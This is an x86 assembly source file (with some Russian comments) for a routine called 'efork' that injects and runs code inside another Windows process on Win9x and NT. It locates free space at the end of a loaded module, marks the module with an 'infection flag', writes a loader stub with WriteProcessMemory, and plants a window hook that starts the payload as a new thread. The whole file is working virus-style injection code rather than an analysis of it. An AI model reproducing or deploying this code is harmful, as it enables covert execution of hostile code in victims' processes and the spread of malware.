;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;	efork creates remote thread both in win9x and winNT
; 	must be included:
;	windows.inc, eaxapi*.inc, pestruct.inc, consts.inc
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
mrec 	equ rec
locals __
locals @@

MAX_MODULE_NAME32	equ 256
MAX_PATH		equ 260

MODULEENTRY32	struc
dwSize		dd 0
th32ModuleID	dd 0
th32ProcessID	dd 0
GlblcntUsage	dd 0
ProccntUsage	dd 0
modBaseAddr	dd 0
modBaseSize	dd 0
hModule		dd 0
szModule	db MAX_MODULE_NAME32+1 dup (0)
szExePath	db MAX_PATH dup (0)
MODULEENTRY32	ends
me_size	equ 	224h

efork proc
; создание потока
;efork(pid, paddr, icaddr, ofs, ics, hwnd, thid)
; args
__pid 	equ ebx+4 ptr 28h 	; target process id 
__paddr	equ ebx+4 ptr 2Ch	; destination address 
__icaddr	equ ebx+4 ptr 30h	; source address
__ofs	equ	ebx+4 ptr 34h	; offset of entrypoint
__ics	equ ebx+4 ptr 38h 	; size of code
__hw	equ ebx+4 ptr 3Ch	; one of process windows
__thid	equ ebx+4 ptr 40h	; target thread id
; locals
__nt	equ ebx-4 ptr 4h
__hth	equ ebx-4 ptr 8h
__me32	equ ebx-4 ptr 3FCh
__fname	equ ebx-4 ptr 400h ;?
__hproc	equ ebx-4 ptr 500h
__ptch	equ ebx-4 ptr 504h
__inj_addr	equ ebx-4 ptr 50Ch
__hmemmap 	equ ebx-4 ptr 510h
__nbytes 	equ ebx-4 ptr 514h
__mapmem	equ ebx-4 ptr 518h
__hmemdup 	equ ebx-4 ptr 51Ch
__hhook	equ ebx-4 ptr 528h

; consts
__args_size	equ 7*4
__locals_size	equ 700h
__hmnum	equ 100h
	pushad
	push ebx
	mov ebx, esp
	sub esp, __locals_size ; for local values
	; opening process
	push dword ptr [__pid]

	push 0
	push PROCESS_ALL_ACCESS
	xcall OpenProcess
	mov dword ptr [__hproc], eax
	or eax, eax
	jz __efork_fail

	; obtain memory for our HMODULES
	mov eax, __hmnum*4
	call _valloc
	mov [__hmemmap], eax
	or eax, eax
	jz __efork_fail
	
	xcall GetVersion
	not eax
	ror eax, 31
	and eax, 1
	mov [__nt], eax
	or eax, eax
	jnz __nt_getmodules

__w9x_getmodules: ; obtaining the list of modules in win 9x

	mov [__nbytes], 0

TH32CS_SNAPMODULE	equ 00000008h
	push dword ptr [__pid]
	push TH32CS_SNAPMODULE
	xcall CreateToolhelp32Snapshot
	mov [__hth], eax
	cmp eax, -1
	jz __efork_fail
__me_size	equ 	224h
	mov dword ptr [__me32+0], __me_size
	lea eax, [__me32]
	push eax
	push dword ptr [__hth]
	xcall Module32First
	or eax, eax
	jz __efork_fail
	jmp __w9x_module_search

__w9xmodule_next:
	lea eax, [__me32]
	push eax
	push dword ptr [__hth]
	xcall Module32Next
	or eax, eax
	jz __search_mem
__w9x_module_search:
	; found HMODULE
	mov ecx, [__nbytes]
	add [__nbytes], 4
	cmp ecx, __hmnum*4-4
	jg __efork_fail
	mov esi, [__hmemmap]
	mov eax, [__me32+1Ch]	; eax=HMODULE
	mov [esi+ecx], eax
	jmp __w9xmodule_next

__nt_getmodules:
	; get HMODULEs
	lea eax, [__nbytes]
	push eax
	push __hmnum*4
	push dword ptr [__hmemmap]
	push dword ptr [__hproc]
	xcall EnumProcessModules
	or eax, eax
	jz __efork_fail

__search_mem:	
	mov ecx, [__nbytes] ; get number of obtained HMODULEs
	sar ecx, 2 ; divide by 4
	mov esi, [__hmemmap]
__enum_loop:
	mov eax, [esi+ecx*4-4]
	mov edx, [__hproc]
	call _memorysearch
	or eax, eax
	jnz __mem_found
	loop __enum_loop
	jmp __efork_fail
__mem_found:
	; free memory!
	pushad
	mov eax, [__hmemmap]
	call _vfree
	popad

__inject:

	; eax->address where we're injecting our code
	mov [__inj_addr], eax
	mov eax, [__paddr]
	mov [ebp+__caddr-mrec], eax
	mov eax, [__ics]
	mov [ebp+__csize-mrec], eax
	mov eax, [__ofs]
	mov [ebp+__cofs-mrec], eax
	apiaddr VirtualAlloc, mrec
	mov [ebp+__mVirtualAlloc-mrec], eax
	apiaddr GlobalAlloc, mrec
	mov [ebp+__mGlobalAlloc-mrec], eax
	apiaddr CreateThread, mrec
	mov [ebp+__mCreateThread-mrec], eax
	apiaddr OpenProcess, mrec
	mov [ebp+__mOpenProcess-mrec], eax
	apiaddr ReadProcessMemory, mrec
	mov [ebp+__mReadProcessMemory-mrec], eax
	apiaddr CloseHandle, mrec
	mov [ebp+__mCloseHandle-mrec], eax
	apiaddr UnmapViewOfFile, mrec
	mov [ebp+__mUnmapViewOfFile-mrec], eax
	apiaddr MapViewOfFile, mrec
	mov [ebp+__mMapViewOfFile-mrec], eax
	apiaddr Sleep, mrec
	mov [ebp+__mSleep-mrec], eax
	apiaddr UnhookWindowsHookEx, mrec
	mov [ebp+__mUnhookWindowsHookEx-mrec], eax


	; create map view of file
	mov eax, [__ics]
	add eax, __icsize+4
	push eax
	push 0
	push eax
	push 0
	push PAGE_READWRITE
	push 0
	push -1
	xcall CreateFileMappingA
	mov [__hmemmap], eax
	pop ecx
	or eax, eax
	jz __efork_fail

	push ecx
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push dword ptr [__hmemmap]
	xcall MapViewOfFile
	mov [__mapmem], eax
	or eax, eax
	jz __efork_fail

	; read old memory contents (must be 0)
	mov esi, __icsize
	mov edi, [__mapmem]
	add edi, 4
	mov edx, [__hproc]
	mov ecx, [__inj_addr]
	call _memread
	or eax, eax
	jz __efork_fail

	; copy the thread code to the rest of buffer
	mov edi, [__mapmem]
	add edi, __icsize+4
	mov ecx, [__ics]
	mov esi, [__icaddr]
	rep movsb


	; creating the dup of mapview handle
	mov eax, [__hmemmap]
	mov esi, [__hproc]
	call _duphandle
	mov dword ptr [ebp+__hmem1-mrec], eax
	or eax, eax
	jz __efork_fail

	; patching
	; 1. copy the loader
	mov esi, __icsize
	lea edi, [ebp+__inj_code-mrec]
	mov edx, [__hproc]
	mov ecx, [__inj_addr]
	call _memwrite
	or eax, eax
	jz __efork_fail
	; 2. install the hook
	push dword ptr [__thid]
	push 0
	push '23le'
	push 'nrEK'
	push esp
	xcall GetModuleHandleA
	add esp, 12
	push eax
	push dword ptr [__inj_addr]
	push WH_CALLWNDPROC
	xcall SetWindowsHookEx

	mov 4 ptr [__hhook], eax
	mov edi, [__mapmem]
;	mov esi, [hproc]
;	call _duphandle
	; we need not to dup the handles of hooks
	mov [edi], eax	; copy handle of hook to the buffer
	or eax, eax
	jz __efork_fail

	; send message to run the hook
	push 0 0 WM_PAINT
	push dword ptr [__hw]
	xcall SendMessageA
	push WAITTIME
	xcall Sleep

__efork_end:
	mov esp, ebx
	pop ebx
	popad
	push 1
	pop eax
	ret __args_size

__efork_fail:
	mov esp, ebx
	pop ebx
	popad
	xor eax, eax ; return 0
	ret __args_size

;--------------------------------------------------------
_memorysearch:
; look for block of free memory in a module
; in
; edx=HPROCESS
; eax=HMODULE
; icsize=size of requested block
; out
; eax=address of memory
	; save registers
	push ebx ecx edi esi

	; reading header
	mov ecx, eax
	lea eax, [eax].mz_neptr
	call _memreaddw ; считываем из памяти
	add eax, ecx
	mov ebx, eax ; ebx -> pe-header
	call _memreaddw
	cmp ax, 4550h
	jnz __ms_fail

	lea eax, [ebx].pe_imagesize
	call _memreaddw
	mov esi, eax
	lea eax, [ebx].pe_imagebase
	call _memreaddw
	call _memprotect
	or eax, eax
	jz __ms_fail

	; check infection flag
	lea eax, [ebx+4Ch]
	call _memreaddw
	cmp eax, INFFLAG
	jz __ms_fail

	push ecx
	push 4
	pop esi
	lea ecx, [ebx+4Ch]
	push INFFLAG
	mov edi, esp ; edi -> our buffer, ecx -> buffer of oher process
	call _memwrite
	pop ecx
	pop ecx
	or eax, eax
	jz __ms_fail

	lea eax, [ebx].pe_imagebase
	call _memreaddw
	mov edi, eax	; edi = imagebase of module
	lea eax, [ebx].pe_imagesize
	call _memreaddw
	sub eax, __icsize+1
	add eax, edi
	mov esi, eax
	call _memreaddw
	; check for free space at the end of imagesize
	or eax, eax
	jnz __ms_fail
	; if we have free space, return its address
	jmp __ms_ok

__ms_fail:
	push 0
	jmp __ms_ret
__ms_ok:
	push esi
__ms_ret:
	pop eax
	pop esi edi ecx ebx
	retn

;--------------------------------------------------------------
_duphandle:
; dup the handle to other process
; eax = handle
; esi = destination process handle
	push edx ; uses
	push esp
	mov edx, esp
	push DUPLICATE_SAME_ACCESS
	push 1
	push 0
	push edx
	push esi
	push eax
	xcall GetCurrentProcess
	push eax
	xcall DuplicateHandle
	pop edx
	or eax, eax
	jz @@70
	push edx
	jmp @@71

@@70:
	push 0
@@71:
	pop eax
	pop edx
	ret
;--------------------------------------------------------------
_memprotect:
; change protection of the memory
;esi - size
;edx - handle
;eax - address
; return value 1=success, 0=error
	push ecx edx edi
	; protecting memory
	push esp
	push esp
	push PAGE_READWRITE
	push esi
	push eax
	push edx
	xcall VirtualProtectEx
	pop edx
	pop edi edx ecx
	retn
;--------------------------------------------------------------
_memreaddw:
; read DWORD from process
; eax - addr
; edx - handle
; return value = eax
	push edi esi ecx edx
	push 4
	pop esi
	mov ecx, eax
	push eax
	mov edi, esp
	call _memread
	pop eax
	pop edx ecx esi edi
	retn
;--------------------------------------------------------------
_memread:
; read from process
;esi - size
;edi - buff
;edx - handle
;ecx - address
	push edx
	lea eax, [ebp+_ReadProcessMemory-mrec]
	jmp @@123
_memwrite:
	push edx
	lea eax, [ebp+_WriteProcessMemory-mrec]
@@123:
	push 0
	push esi
	push edi
	push ecx
	push edx
	call eax
	pop edx
	retn

;--------------------------------------------------------------
__inj_code:; ---/ZAIKA
; hook reads code of thread from shared memory, allocates new memory for it,
; runs the new thread and returns
;LRESULT CALLBACK CallWndProc(int nCode,	// hook code
;    WPARAM wParam,	// current-process flag
;    LPARAM lParam 	// address of structure with message data
;   );
__lparam 	equ ebx+18
__wparam	equ ebx+1Ch
__ncode	equ ebx+20h

	pushad
	call __re2
__re2:
__r2	db 5Dh ; pop ebp
	push ebx
	mov ebx, esp
	cmp byte ptr [ebp+__first-__r2], 0
	jz __return_back
	mov byte ptr [ebp+__first-__r2], 0

	; allocate memory for copy of the hook
	push PAGE_READWRITE
	push MEM_COMMIT
	push __icsize
	push 0
;	push 40h
	call [ebp+__mVirtualAlloc-__r2]
;	call [ebp+__mGlobalAlloc-__r2]
	mov edi, eax
	or eax, eax
	jz __return_back



	; copy ourselves
	lea esi, [ebp-(__r2-__inj_code)]
	mov [ebp+__ic_addr-__r2], esi
	mov ecx, __icsize
	rep movsb

	; jump to copy
	add eax, (__inj_code2-__inj_code)
	jmp eax

__inj_code2:
	call __re4
__re4:
__r4	db 5Dh ; pop ebp

	; allocate memory for the thread
	push PAGE_READWRITE
	push MEM_COMMIT
	push dword ptr [ebp+__csize-__r4]
	push dword ptr [ebp+__caddr-__r4]
	call [ebp+__mVirtualAlloc-__r4]
	mov [ebp+__mem-__r4], eax
	or eax, eax
	jz __return_back


	; open shared memory
	mov eax, [ebp+__csize-__r4]
	add eax, __icsize+4
	push eax
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push dword ptr [ebp+__hmem1-__r4]
	call [ebp+__mMapViewOfFile-__r4]
	mov [ebp+__mem1-__r4], eax
	or eax, eax
	jz __return_back
	push eax
	; delay
	push 50
	call [ebp+__mSleep-__r4]
	; kill hook
	pop eax
	push dword ptr [eax]
	call [ebp+__mUnhookWindowsHookEx-__r4]

	; we don't restore memory at the hook because system may get unstable 
;	mov ecx, __icsize
;	mov edi, [ebp+__ic_addr-__r4]
;	mov esi, [ebp+__mem1-__r4]
;	add esi, 4
;	rep movsb

	; copy thread code
	mov esi, [ebp+__mem1-__r4]
	add esi, __icsize+4
	mov edi, [ebp+__mem-__r4]
	mov ecx, [ebp+__csize-__r4]
	rep movsb

	; run thread
	push esp
	push esp
	push 0
	push 0
	mov eax, dword ptr [ebp+__mem-__r4]
	add eax, dword ptr [ebp+__cofs-__r4]
	push eax
	push 10000h
	push 0
	call [ebp+__mCreateThread-__r4]
	pop ecx
	; close shared memory
	push dword ptr [ebp+__mem1-__r4]
	call [ebp+__mUnmapViewOfFile-__r4]
	push dword ptr [ebp+__hmem1-__r4]
	call [ebp+__mCloseHandle-__r4]
	; return
__return_back:
	mov esp, ebx
	pop ebx
	popad
	xor eax, eax
	ret 12

__mem	dd 0		; pointer to memory allocated in other process
__mem1	dd 0
__hmem1	dd 0 	; handle of shared memory with hook handle and thread code
__first	db 1
__caddr	dd 0	; адрес для размещения потока
__cofs	dd 0	; смещение от начала
__csize	dd 0	; размер инжектируемого кода
__ic_addr	dd 0
__mVirtualAlloc	dd 0
__mGlobalAlloc	dd 0
__mCreateThread	dd 0
__mOpenProcess	dd 0
__mReadProcessMemory 	dd 0
__mCloseHandle	dd 0
__mUnmapViewOfFile	dd 0
__mMapViewOfFile	dd 0

__mSleep	dd 0
__mUnhookWindowsHookEx	dd 0
__icsize 	equ $-__inj_code
efork endp



WAITTIME	equ 50
INFFLAG	equ 1234h

; wanted api
; kernel32
;declfunc 	OpenProcess
;declfunc 	GetVersion
;declfunc	CreateToolhelp32Snapshot
;declfunc	Module32First
;declfunc	Module32Next
;declfunc	GetCurrentProcessId
;declfunc	GetCurrentProcess
;declfunc	CreateFileMappingA
;declfunc	MapViewOfFile
;declfunc	UnmapViewOfFile
;declfunc	CloseHandle
;declfunc	VirtualAlloc
;declfunc	GlobalAlloc
;declfunc	GlobalFree
;declfunc	CreateThread
;declfunc	ReadProcessMemory
;declfunc	WriteProcessMemory
;declfunc	VirtualProtectEx
;declfunc	GetModuleHandleA
;declfunc	DuplicateHandle
;declfunc	ExitThread
;declfunc	Sleep
; user32
;declfunc	SetWindowsHookEx
;declfunc	UnhookWindowsHookEx
;declfunc	SendMessageA
; psapi
;declfunc	EnumProcessModules

